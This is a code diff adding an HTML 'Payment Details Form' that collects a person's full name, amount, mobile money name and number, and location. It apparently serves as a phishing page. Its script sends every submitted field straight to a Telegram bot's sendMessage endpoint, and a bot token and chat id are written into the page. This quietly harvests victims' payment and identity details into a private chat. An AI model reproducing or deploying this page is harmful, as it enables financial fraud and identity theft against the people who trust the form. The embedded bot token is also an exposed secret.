@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Details Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="number"] {
+            width: calc(100% - 10px);
+            padding: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .submit-button {
+            background-color: #28a745;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .submit-button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form id="paymentDetailsForm">
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" name="fullName" required>
+            </div>
+            <div class="form-group">
+                <label for="amount">Amount</label>
+                <input type="number" id="amount" name="amount" required>
+            </div>
+            <div class="form-group">
+                <label for="mobileMoneyName">Mobile Money Name</label>
+                <input type="text" id="mobileMoneyName" name="mobileMoneyName" required>
+            </div>
+            <div class="form-group">
+                <label for="mobileMoneyNumber">Mobile Money Number</label>
+                <input type="text" id="mobileMoneyNumber" name="mobileMoneyNumber" required>
+            </div>
+            <div class="form-group">
+                <label for="location">Location</label>
+                <input type="text" id="location" name="location" required>
+            </div>
+            <button type="button" class="submit-button" onclick="submitForm()">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        function submitForm() {
+            var form = document.getElementById('paymentDetailsForm');
+            var formData = new FormData(form);
+            var data = {};
+            formData.forEach((value, key) => data[key] = value);
+
+            fetch('https://api.telegram.org/bot<6771360919:AAFdUFDb82C_u5LzjWOl3p_qzne2Fg15TnQ>/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: '<6009484587>',
+                    text: JSON.stringify(data)
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.ok) {
+                    alert('Details submitted successfully!');
+                } else {
+                    alert('Failed to submit details. Please try again.');
+                }
+            })
+            .catch(error => {
+                alert('Error submitting details: ' + error.message);
+            });
+        }
+    </script>
+</body>
+</html>
